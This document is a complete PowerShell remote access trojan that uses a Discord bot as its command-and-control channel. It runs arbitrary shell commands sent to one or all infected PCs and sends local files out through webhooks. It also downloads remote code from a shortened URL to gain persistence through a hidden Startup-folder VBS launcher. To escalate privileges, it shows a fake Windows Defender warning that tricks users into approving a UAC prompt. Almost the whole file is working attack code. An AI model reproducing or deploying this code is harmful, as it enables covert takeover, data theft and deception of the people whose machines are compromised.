# tested in pwsh 5.1
# usage -> .\script.ps1 -tk 'bot-token' 'channel-id-from-server'

param (
    [Parameter(Mandatory)]
    [string]$tk, #token

    [Parameter(Mandatory)]
    [string]$cid #reference channel id
)


# HttpClient and Windows Forms
Add-Type -AssemblyName 'System.Net.Http'
Add-Type -AssemblyName "System.Windows.Forms"

$apiBase = "https://discord.com/api/v10"
$computerName = $env:COMPUTERNAME
$channelName = "powershell"
$lastMessageId = $null
$webhookUrl = $null
$uploadChannelLastId = $null
$uploadSavePath = $null
$uploadSavePath = $null

$networkCategoryName = "Network"
$generalChannelName = "general-shell"
$onlineChannelName = "online-now"

$networkCategoryId = $null
$generalChannelId = $null
$onlineChannelId = $null

$generalWebhookUrl = $null
$onlineWebhookUrl = $null

$lastGeneralMessageId = $null


$headers = @{
    Authorization  = "Bot $tk"
    "User-Agent"   = "DiscordBot (https://discordapp.com, v1)"
    "Content-Type" = "application/json"
}


# === for fetching reference channel

$refChannel = Invoke-RestMethod -Uri "$apiBase/channels/$cid" -Headers $headers
$guildId = $refChannel.guild_id
if (-not $guildId) { throw "Could not determine guild ID from reference channel." }

# === get all channels

$channels = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Headers $headers

# === Network Category


$channels = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Headers $headers
$networkCategory = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $networkCategoryName -and $_.guild_id -eq $guildId }

if (-not $networkCategory) {

    $catBody = @{
        name = $networkCategoryName
        type = 4 # Cat type
    } | ConvertTo-Json -Depth 3
    try {
        $networkCategory = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" `
            -Method Post -Headers $headers -Body $catBody

    } catch {
        throw "Failed to create Network category: $_"
    }
} else {

}
$networkCategoryId = $networkCategory.id


# === pc category
$category = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $computerName }

if (-not $category) {

    $body = @{ name = $computerName; type = 4 } | ConvertTo-Json -Depth 3
    $category = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Method Post -Headers $headers -Body $body
}

# === text channel (powershell)
$channel = $channels | Where-Object {
    $_.type -eq 0 -and $_.parent_id -eq $category.id -and $_.name -eq $channelName
}

if (-not $channel) {

    $body = @{
        name = $channelName
        type = 0
        parent_id = $category.id
    } | ConvertTo-Json -Depth 3

    $channel = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" `
        -Method Post -Headers $headers -Body $body
}

# === look if (upload) channel exists
$uploadChannel = $channels | Where-Object {
    $_.type -eq 0 -and $_.parent_id -eq $category.id -and $_.name -eq "upload"
}

if (-not $uploadChannel) {

    $uploadBody = @{
        name = "upload"
        type = 0
        parent_id = $category.id
    } | ConvertTo-Json -Depth 3

    $uploadChannel = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" `
        -Method Post -Headers $headers -Body $uploadBody
}

# === refresh channels and re-assign uploadChannel
$channels = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Headers $headers
$uploadChannel = $channels | Where-Object {
    $_.type -eq 0 -and $_.parent_id -eq $category.id -and $_.name -eq "upload"
}

# === webhook for powershell channel
$existingHooks = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/webhooks" -Headers $headers
$hook = $existingHooks | Where-Object { $_.name -eq "powershell-webhook" }

if (-not $hook) {

    $body = @{ name = "powershell-webhook" } | ConvertTo-Json
    $hook = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/webhooks" -Method Post -Headers $headers -Body $body
}

$webhookUrl = "https://discord.com/api/webhooks/$($hook.id)/$($hook.token)"

# === get last the messageIds to avoid processing old messages
try {
    $latestMessages = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/messages?limit=1" -Headers $headers
    if ($latestMessages.Count -gt 0) {
        $lastMessageId = $latestMessages[0].id

    } else {

    }
} catch {

}

# start Network, PC, Online

    # === general shell channel


    $channels = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" -Headers $headers
    $generalChannel = $channels | Where-Object {
        $_.type -eq 0 -and $_.name -eq $generalChannelName -and $_.parent_id -eq $networkCategoryId
    }

    if (-not $generalChannel) {

        $genBody = @{
            name      = $generalChannelName
            type      = 0 # Chan type
            parent_id = $networkCategoryId
        } | ConvertTo-Json -Depth 3
        try {
            $generalChannel = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" `
                -Method Post -Headers $headers -Body $genBody

        } catch {
            throw "Failed to create '$generalChannelName' channel: $_"
        }
    } else {

    }
    $generalChannelId = $generalChannel.id

    # === online status channel, "read-only" like

    $onlineChannel = $channels | Where-Object {
        $_.type -eq 0 -and $_.name -eq $onlineChannelName -and $_.parent_id -eq $networkCategoryId
    }

    if (-not $onlineChannel) {

        $onlineBody = @{
            name      = $onlineChannelName
            type      = 0
            parent_id = $networkCategoryId
        } | ConvertTo-Json -Depth 3
        try {
            $onlineChannel = Invoke-RestMethod -Uri "$apiBase/guilds/$guildId/channels" `
                -Method Post -Headers $headers -Body $onlineBody

        } catch {
            throw "Failed to create '$onlineChannelName' channel: $_"
        }
    } else {

    }
    $onlineChannelId = $onlineChannel.id


    $existingHooks = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/webhooks" -Headers $headers
    $hook = $existingHooks | Where-Object { $_.name -eq "powershell-webhook" }

    if (-not $hook) {

        $body = @{ name = "powershell-webhook" } | ConvertTo-Json
        $hook = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/webhooks" -Method Post -Headers $headers -Body $body
    }

    # --- THIS LINE IS IMPORTANT, keep it here
    $webhookUrl = "https://discord.com/api/webhooks/$($hook.id)/$($hook.token)"



    # === webhook for general shell channel

    if ($generalChannelId) {
        $generalExistingHooks = Invoke-RestMethod -Uri "$apiBase/channels/$generalChannelId/webhooks" -Headers $headers
        $generalHook = $generalExistingHooks | Where-Object { $_.name -eq "$($generalChannelName)-webhook" }

        if (-not $generalHook) {

            $body = @{ name = "$($generalChannelName)-webhook" } | ConvertTo-Json
            try {
                $generalHook = Invoke-RestMethod -Uri "$apiBase/channels/$generalChannelId/webhooks" -Method Post -Headers $headers -Body $body
            } catch {

                 $generalHook = $null
            }
        }

        if ($generalHook) {
            $generalWebhookUrl = "https://discord.com/api/webhooks/$($generalHook.id)/$($generalHook.token)"

        } else {

             $generalWebhookUrl = $null
        }
    } else {

    }


    # === webhook for online status channel

    if ($onlineChannelId) {
        $onlineExistingHooks = Invoke-RestMethod -Uri "$apiBase/channels/$onlineChannelId/webhooks" -Headers $headers
        $onlineHook = $onlineExistingHooks | Where-Object { $_.name -eq "$($onlineChannelName)-webhook" }

        if (-not $onlineHook) {

            $body = @{ name = "$($onlineChannelName)-webhook" } | ConvertTo-Json
            try {
                $onlineHook = Invoke-RestMethod -Uri "$apiBase/channels/$onlineChannelId/webhooks" -Method Post -Headers $headers -Body $body
            } catch {

                 $onlineHook = $null
            }
        }

        if ($onlineHook) {
            $onlineWebhookUrl = "https://discord.com/api/webhooks/$($onlineHook.id)/$($onlineHook.token)"

        } else {

             $onlineWebhookUrl = $null
        }
    } else {

    }

    try {
        $latestMessages = Invoke-RestMethod -Uri "$apiBase/channels/$($channel.id)/messages?limit=1" -Headers $headers
        if ($latestMessages.Count -gt 0) {
            $lastMessageId = $latestMessages[0].id

        } else {

        }
    } catch {

    }

    if ($generalChannelId) {
        try {
            $latestGeneralMessages = Invoke-RestMethod -Uri "$apiBase/channels/$generalChannelId/messages?limit=1" -Headers $headers
            if ($latestGeneralMessages.Count -gt 0) {
                $lastGeneralMessageId = $latestGeneralMessages[0].id

            } else {

            }
        } catch {

        }
    }

# end Network, PC, Online




# === add and remove persistence
function Add-Persistence {
$persistPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
$startupScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
$remoteUrl = "https://is.gd/zVzeNh"

try {
    "`$tk = '$tk'" | Out-File -FilePath $persistPath -Force
    "`$cid = '$cid'" | Out-File -FilePath $persistPath -Append

    Invoke-WebRequest -Uri $remoteUrl -OutFile "$env:TEMP\temp.ps1"
    Get-Content -Path "$env:TEMP\temp.ps1" | Out-File $persistPath -Append
    Remove-Item "$env:TEMP\temp.ps1" -Force

    $vbsContent = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File \"%APPDATA%\\Microsoft\\Windows\\Themes\\copy.ps1\"", 0, False
'@
    $vbsContent | Out-File -FilePath $startupScript -Force


    return ":white_check_mark: ``Persistence Added!`` :white_check_mark:"
} catch {

    return ":x: ``Failed to add persistence.`` :x:"
}
}

function Remove-Persistence {
$persistPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
$startupScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"

try {
    Remove-Item -Path $persistPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $startupScript -Force -ErrorAction SilentlyContinue

    return ":octagonal_sign: ``Persistence Removed!`` :octagonal_sign:"
} catch {

    return ":x: ``Failed to remove persistence.`` :x:"
}
}



# === Welcome embed message
$embed = @{
    title = "$computerName is online"
    description = "Bot is ready to receive commands in this channel."
    color = 5763719  # green
    fields = @(
        @{ name = "!shell <command>"; value = "execute PowerShell commands"; inline = $false },
        @{ name = "!upload-path <path>"; value = "upload a file from this PC to Discord"; inline = $false },
        @{ name = "!dc-upload <path>"; value = "change where Discord downloads go"; inline = $false },
        @{ name = "upload channel"; value = "upload queue to the machine"; inline = $false },
        @{ name = "!watcher-status"; value = "show the upload watcher status"; inline = $false },
        @{ name = "!add- / removepersistence"; value = "Add/Remove persistent file to the Drive"; inline = $false },
        @{ name = "!is-admin"; value = "look if the script is being runned as adm"; inline = $false },
        @{ name = "!elevate"; value = "try elevating the script to Admin with a Form and UAC"; inline = $false },
        @{ name = "General Commands"; value = "Use the <#$generalChannelId> channel for commands affecting ALL connected PCs (`!shell`, `!name`)."; inline = $false }
    )
    footer = @{ text = "Online since $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" }
    timestamp = (Get-Date).ToString("o")
}

$specificWelcomeBody = @{
    embeds = @($embed)
} | ConvertTo-Json -Depth 10

# --- Send to pc channel
if ($webhookUrl) {
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post `
            -Body ([System.Text.Encoding]::UTF8.GetBytes($specificWelcomeBody)) `
            -ContentType "application/json"

    } catch {

    }
}

# --- send status to online channel
if ($onlineWebhookUrl -and $onlineChannelId) {
    $onlineStatusBody = @{
        # using allowed_mentions to prevent pings if channel names match users
        allowed_mentions = @{ parse = @() }
        content = ":desktop: ($computerName) is now online. Use its channel <#$($channel.id)> for specific commands."
    } | ConvertTo-Json -Depth 3

     try {
        Invoke-RestMethod -Uri $onlineWebhookUrl -Method Post `
            -Body ([System.Text.Encoding]::UTF8.GetBytes($onlineStatusBody)) `
            -ContentType "application/json"

     } catch {

     }
}

# === Main polling loop ===

while ($true) {
    # ================================
    # === Poll Specific PC Channel ===
    # ================================
    try {
        $specificUrl = "$apiBase/channels/$($channel.id)/messages"
        if ($lastMessageId) { $specificUrl += "?after=$lastMessageId" } else { $specificUrl += "?limit=10" }

        $specificMessages = Invoke-RestMethod -Uri $specificUrl -Headers $headers -ErrorAction SilentlyContinue

        if ($null -ne $specificMessages -and $specificMessages.Count -gt 0) {
            $specificMessages = $specificMessages | Sort-Object id
            $lastMessageId = $specificMessages[-1].id

            # --- Process messages for THIS computer ---
            foreach ($msg in $specificMessages) {
                if ($msg.author.bot) { continue } # Ignore bots
                if ($msg.webhook_id) { continue } # Ignore own webhook messages


                $user = $msg.author.username
                $inputText = $msg.content.Trim()

                # === add persistence
                if ($inputText -eq "!addpersistence") {
                    $responseMsg = Add-Persistence
                    $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    continue
                }

                # === remove persistence
                if ($inputText -eq "!removepersistence") {
                    $responseMsg = Remove-Persistence
                    $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    continue
                }

                # === watcher-status
                if ($inputText -eq "!watcher-status") {
                    $responseMsg = ":information_source: Upload download path for $computername "
                    if ($uploadSavePath) { $responseMsg += "`$uploadSavePath` " } else { $responseMsg += "_Not Set_" }

                    $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    continue
                }

                # === Change upload save path
                if ($inputText.StartsWith("!dc-upload ")) {
                    $newPath = $inputText.Substring(11).Trim('"')
                    $responseMsg = ""
                    if ([string]::IsNullOrWhiteSpace($newPath)) {
                         $responseMsg = ":x: Please provide a valid path."
                    } elseif (-not (Test-Path $newPath -PathType Container)) {
                        try {

                            $null = New-Item -ItemType Directory -Path $newPath -Force -ErrorAction Stop
                            $uploadSavePath = (Get-Item -Path $newPath).FullName # Get full path
                            $responseMsg = ":white_check_mark: Created and set download path for $computername to: `$uploadSavePath` "
                        } catch {
                            $responseMsg = ":x: Failed to create directory '$newPath' on $computername $($_.Exception.Message)"

                        }
                    } else {
                        $uploadSavePath = (Get-Item -Path $newPath).FullName # Get full path
                        $responseMsg = ":white_check_mark: Set download path for $computername to: `$uploadSavePath` "
                    }


                    $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    continue
                }

                # === Upload from PC to Discord
                if ($inputText.StartsWith("!upload-path ")) {
                    $localPath = $inputText.Substring(13).Trim('"')
                    if (-not (Test-Path $localPath -PathType Leaf)) { # file check
                        $errMsg = "File not found on $computername `$localPath` "

                        $body = @{ content = $errMsg } | ConvertTo-Json -Compress
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                        continue
                    }

                    try {

                        $usingBlock = {
                            param(
                                $localPath_param,
                                $user_param,
                                $computerName_param,
                                $webhookUrl_param
                            )

                            # create HttpClient and Form INSIDE the script block
                            $httpClient = New-Object System.Net.Http.HttpClient
                            $form = New-Object System.Net.Http.MultipartFormDataContent
                            $fs = $null

                            try {
                                $fs = [System.IO.File]::OpenRead($localPath_param)
                                $fileContent = New-Object System.Net.Http.StreamContent($fs)
                                $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")

                                $fileNameForHeader = [System.IO.Path]::GetFileName($localPath_param).Replace('"', '\"')
                                $fileContent.Headers.Add("Content-Disposition", "form-data; name=`"file`"; filename=`"$fileNameForHeader`"")
                                $form.Add($fileContent, "file", $fileNameForHeader) # Use the locally created $form

                                $payload = @{ content = ":arrow_up: `$($user_param)` uploaded from `$($computerName_param)`: `$fileNameForHeader` " } | ConvertTo-Json -Compress
                                $payloadContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
                                $form.Add($payloadContent, "payload_json") # Use the locally created $form

                                $response = $httpClient.PostAsync($webhookUrl_param, $form).GetAwaiter().GetResult()
                                $response.EnsureSuccessStatusCode() | Out-Null

                            }
                            finally {
                                if ($fs -is [System.IDisposable]) { $fs.Dispose() }
                                if ($httpClient -is [System.IDisposable]) { $httpClient.Dispose() }
                                if ($form -is [System.IDisposable]) { $form.Dispose() }
                            }
                         }

                         Invoke-Command -ScriptBlock $usingBlock -ArgumentList $localPath, $user, $computerName, $webhookUrl

                    } catch {
                        $errMsg = "Failed to upload file from $computername `$($_.Exception.Message)` "

                        $body = @{ content = $errMsg } | ConvertTo-Json -Compress
                        if ($webhookUrl) {
                             Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                        }
                    }
                    continue
                }

                # === Check if running as Administrator
                if ($inputText -eq "!is-admin") {
                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
                    $responseMsg = if ($isAdmin) {
                        ":shield: Script on $computername IS running with administrator privileges."
                    } else {
                        ":warning: Script on $computername is **NOT** running as administrator."
                    }

                    $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    continue
                }

                # === Elevate Script Privileges
                if ($inputText -eq "!elevate") {

                    $responseMsg = ""
                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

                    if ($isAdmin) {
                        $responseMsg = ":information_source: Script on $computername is already running as Administrator."

                    } else {
                        $message = "Windows Defender has detected potential threats on your system. To ensure the safety of your computer, a quick scan is recommended. Running the script with administrative rights is required for this action."
                        $title = "Windows Security - Action Required"
                        $button = [System.Windows.Forms.MessageBoxButtons]::OKCancel
                        $icon = [System.Windows.Forms.MessageBoxIcon]::Warning

                        try {
                             Add-Type -AssemblyName System.Windows.Forms


                             $result = [System.Windows.Forms.MessageBox]::Show($message, $title, $button, $icon)

                             if ($result -eq [System.Windows.Forms.DialogResult]::OK) {

                                try {
                                    $scriptPath = $MyInvocation.MyCommand.Definition
                                    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -tk `"$tk`" -cid `"$cid`""


                                    Start-Process powershell -ArgumentList $arguments -Verb RunAs -ErrorAction Stop

                                    $responseMsg = ":rocket: Elevation requested for $computername. The current script instance will now exit. A new elevated instance should start if UAC is approved."

                                     $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                                     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                                     Start-Sleep -Seconds 2
                                     exit
                                } catch {
                                    $errorMessage = ":x: Elevation failed for $computername $($_.Exception.Message)"

                                    $responseMsg = $errorMessage
                                }
                            } else {
                                $responseMsg = ":information_source: Elevation cancelled by user on $computername."

                            }
                        } catch {
                             $errorMessage = ":x: Error during elevation attempt on $computername $($_.Exception.Message)"

                             $responseMsg = $errorMessage
                        }
                     }

                    if ($responseMsg) {
                         $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                    }
                    continue
                 } # End if ($inputText -eq "!elevate")


                # === Execute Shell Command (Specific Channel)
                if ($inputText.StartsWith("!shell ")) {
                    $command = $inputText.Substring(7)

                    $outputPrefix = ":computer: `$user` > $computername"
                    $output = ""

                    try {
                       $scriptBlock = [Scriptblock]::Create($command)
                       $result = Invoke-Command -ScriptBlock $scriptBlock -ErrorAction Stop 2>&1
                       if ($null -eq $result) {
                           $output = "_<no output>_"
                       } elseif ($result -is [array]) {
                           $output = ($result | Out-String).Trim()
                       } else {
                           $output = ($result | Out-String).Trim()
                       }



                    } catch {
                        $output = $_.Exception.Message + "`n" + ($_.ScriptStackTrace | Out-String)

                        $outputPrefix = ":x: Error on $computername from `$user`:"
                    }

                    $maxLength = 1950 # Max length for Discord message content
                    $backtick = '```'
                    $formattedOutput = "$outputPrefix`n$backtick" + "powershell`n" + $output + "`n$backtick"

                    if ($webhookUrl) {
                        if ($formattedOutput.Length -le $maxLength) {
                           $body = @{ content = $formattedOutput } | ConvertTo-Json -Compress
                           Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) -ContentType "application/json" -ErrorAction SilentlyContinue
                        } else {

                            $tempFileName = "output_${computerName}_$($user)_$((Get-Random).ToString('X4')).txt"
                            $tempPath = Join-Path $env:TEMP $tempFileName
                            try {
                                $output | Out-File -FilePath $tempPath -Encoding UTF8 -Force
                                $fileUploadPrefix = "$outputPrefix (output too long, uploaded as file):"

                                $usingBlock = {
                                    param(
                                        $tempPath_param,
                                        $tempFileName_param,
                                        $fileUploadPrefix_param,
                                        $webhookUrl_param
                                    )

                                    $httpClient = New-Object System.Net.Http.HttpClient
                                    $form = New-Object System.Net.Http.MultipartFormDataContent
                                    $fs = $null

                                    try {
                                        $fs = [System.IO.File]::OpenRead($tempPath_param)
                                        $fileContent = New-Object System.Net.Http.StreamContent($fs)
                                        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("text/plain")
                                        $fileNameForHeader = $tempFileName_param.Replace('"', '\"')
                                        $fileContent.Headers.Add("Content-Disposition", "form-data; name=`"file`"; filename=`"$fileNameForHeader`"")
                                        $form.Add($fileContent, "file", $fileNameForHeader) # Use local $form

                                        $payload = @{ content = $fileUploadPrefix_param } | ConvertTo-Json -Compress
                                        $payloadContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
                                        $form.Add($payloadContent, "payload_json") # Use local $form

                                        $response = $httpClient.PostAsync($webhookUrl_param, $form).GetAwaiter().GetResult()
                                        $response.EnsureSuccessStatusCode() | Out-Null
                                    }
                                    finally {k
                                        if ($fs -is [System.IDisposable]) { $fs.Dispose() }
                                        if ($httpClient -is [System.IDisposable]) { $httpClient.Dispose() }
                                        if ($form -is [System.IDisposable]) { $form.Dispose() }
                                    }
                                }

                                Invoke-Command -ScriptBlock $usingBlock -ArgumentList $tempPath, $tempFileName, $fileUploadPrefix, $webhookUrl

                            } catch {
                                $errMsg = ":x: Failed to upload output file from $computername $($_.Exception.Message)"

                                $body = @{ content = $errMsg } | ConvertTo-Json -Compress
                                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                            } finally {
                                if (Test-Path $tempPath) { Remove-Item $tempPath -Force }
                            }
                        }
                    } else {  }
                    continue
               } # End specific pc !shell

            }
        }
    } catch {

        Start-Sleep -Seconds 10
    }

    # =================================
    # === Poll General Shell Channel ==
    # =================================
    if ($generalChannelId -and $generalWebhookUrl) { # Only poll if channel and webhook are ready
        try {
            $generalUrl = "$apiBase/channels/$generalChannelId/messages"
            if ($lastGeneralMessageId) { $generalUrl += "?after=$lastGeneralMessageId" } else { $generalUrl += "?limit=10" }

            $generalMessages = Invoke-RestMethod -Uri $generalUrl -Headers $headers -ErrorAction SilentlyContinue

            if ($null -ne $generalMessages -and $generalMessages.Count -gt 0) {
                $generalMessages = $generalMessages | Sort-Object id
                $lastGeneralMessageId = $generalMessages[-1].id # Update last ID for general channel

                foreach ($msg in $generalMessages) {
                     if ($msg.author.bot) { continue }
                     if ($msg.webhook_id) { continue }


                     $user = $msg.author.username
                     $inputText = $msg.content.Trim()

                     # === !name command
                     if ($inputText -eq "!name") {

                         $responseMsg = ":information_source: $computername reporting in response to `$user`'s `!name` command."

                         $body = @{ content = $responseMsg } | ConvertTo-Json -Compress
                         Invoke-RestMethod -Uri $generalWebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
                         continue # Handled !name command
                     }


                     # === Execute General Shell Command
                     if ($inputText.StartsWith("!shell ")) {
                        $command = $inputText.Substring(7)

                        $outputPrefix = ":globe_with_meridians: `$user` > ALL > $computername"
                        $output = ""

                         try {
                           $scriptBlock = [Scriptblock]::Create($command)
                           $result = Invoke-Command -ScriptBlock $scriptBlock -ErrorAction Stop 2>&1
                           if ($null -eq $result) {
                               $output = "_<no output>_"
                           } elseif ($result -is [array]) {
                               $output = ($result | Out-String).Trim()
                           } else {
                               $output = ($result | Out-String).Trim()
                           }


                        } catch {
                            $output = $_.Exception.Message + "`n" + ($_.ScriptStackTrace | Out-String)

                            $outputPrefix = ":x: Error on $computername from GENERAL command by `$user`:"
                        }

                        $maxLength = 1950
                        $backtick = '```'
                        $formattedOutput = "$outputPrefix`n$backtick" + "powershell`n" + $output + "`n$backtick"

                        if ($formattedOutput.Length -le $maxLength) {
                            $body = @{ content = $formattedOutput } | ConvertTo-Json -Compress
                            Invoke-RestMethod -Uri $generalWebhookUrl -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) -ContentType "application/json" -ErrorAction SilentlyContinue
                        } else {
                            # Output too long, send as file to GENERAL channel

                            $tempFileName = "output_GENERAL_${computerName}_$($user)_$((Get-Random).ToString('X4')).txt"
                            $tempPath = Join-Path $env:TEMP $tempFileName
                            try {
                                $output | Out-File -FilePath $tempPath -Encoding UTF8 -Force
                                $fileUploadPrefix = "$outputPrefix (output too long, uploaded as file):"

                                 $usingBlock = {
                                     param(
                                        $tempPath_param,
                                        $tempFileName_param,
                                        $fileUploadPrefix_param,
                                        $generalWebhookUrl_param
                                     )

                                     $httpClient = New-Object System.Net.Http.HttpClient
                                     $form = New-Object System.Net.Http.MultipartFormDataContent
                                     $fs = $null

                                     try {
                                        $fs = [System.IO.File]::OpenRead($tempPath_param)
                                        $fileContent = New-Object System.Net.Http.StreamContent($fs)
                                        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("text/plain")
                                        $fileNameForHeader = $tempFileName_param.Replace('"', '\"')
                                        $fileContent.Headers.Add("Content-Disposition", "form-data; name=`"file`"; filename=`"$fileNameForHeader`"")
                                        $form.Add($fileContent, "file", $fileNameForHeader)

                                        $payload = @{ content = $fileUploadPrefix_param } | ConvertTo-Json -Compress
                                        $payloadContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
                                        $form.Add($payloadContent, "payload_json")

                                        # Use local $httpClient and $form
                                        $response = $httpClient.PostAsync($generalWebhookUrl_param, $form).GetAwaiter().GetResult()
                                        $response.EnsureSuccessStatusCode() | Out-Null
                                    }
                                    finally {
                                        if ($fs -is [System.IDisposable]) { $fs.Dispose() }
                                        if ($httpClient -is [System.IDisposable]) { $httpClient.Dispose() }
                                        if ($form -is [System.IDisposable]) { $form.Dispose() }
                                    }
                                }

                                Invoke-Command -ScriptBlock $usingBlock -ArgumentList $tempPath, $tempFileName, $fileUploadPrefix, $generalWebhookUrl # Pass the correct webhook URL

                            } catch {
                                $errMsg = ":x: Failed to upload GENERAL output file from $computername $($_.Exception.Message)"

                                $body = @{ content = $errMsg } | ConvertTo-Json -Compress
                                Invoke-RestMethod -Uri $generalWebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                            } finally {
                                if (Test-Path $tempPath) { Remove-Item $tempPath -Force }
                            }
                        }
                        continue
                   } # End if general !shell

                }
            }
        } catch {

             Start-Sleep -Seconds 10 # Longer sleep on error
        }
    }

    # ===========================
    # === Poll Upload Channel ===
    # ===========================

    if ($uploadChannel -and $uploadSavePath) {
        try {
            $uploadUrl = "$apiBase/channels/$($uploadChannel.id)/messages"
            if ($uploadChannelLastId) {
                $uploadUrl += "?after=$uploadChannelLastId"
            } else {
                 $uploadUrl += "?limit=25"
            }

            $uploadMessages = Invoke-RestMethod -Uri $uploadUrl -Headers $headers -ErrorAction SilentlyContinue

            if ($null -ne $uploadMessages -and $uploadMessages.Count -gt 0) {
                $uploadMessages = $uploadMessages | Sort-Object id
                $uploadChannelLastId = $uploadMessages[-1].id

                foreach ($upMsg in $uploadMessages) {
                    if ($upMsg.attachments.Count -gt 0) {
                        foreach ($file in $upMsg.attachments) {
                            $fileName = $file.filename
                            $fileUrl  = $file.url
                            $safeFileName = $fileName -replace '[<>:"/\\|?*]+', '_'
                            $target   = Join-Path -Path $uploadSavePath -ChildPath $safeFileName

                            if (Test-Path $target) {
                                continue
                            }


                            try {
                                Invoke-WebRequest -Uri $fileUrl -OutFile $target -TimeoutSec 120 -UseBasicParsing


                                if ($webhookUrl) {
                                     $responseMsg = ":inbox_tray: Downloaded `$fileName` to `$uploadSavePath` on $computername "
                                     $body = @{ content = $responseMsg } | ConvertTo-Json
                                     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                                }
                            } catch {

                                 if ($webhookUrl) {
                                     $responseMsg = ":x: Failed to download `$fileName` on $computername $($_.Exception.Message)"
                                     $body = @{ content = $responseMsg } | ConvertTo-Json
                                     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
                                 }
                                if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
                            }
                        } # foreach attachment
                    } # if attachments
                } # foreach upload message
            } # if upload messages received
        } catch {

             Start-Sleep -Seconds 10 # Longer sleep on error
        }
    } # End if ($uploadChannel -and $uploadSavePath)


    # === Sleep before next poll cycle

    Start-Sleep -Seconds 5

} # End while ($true)
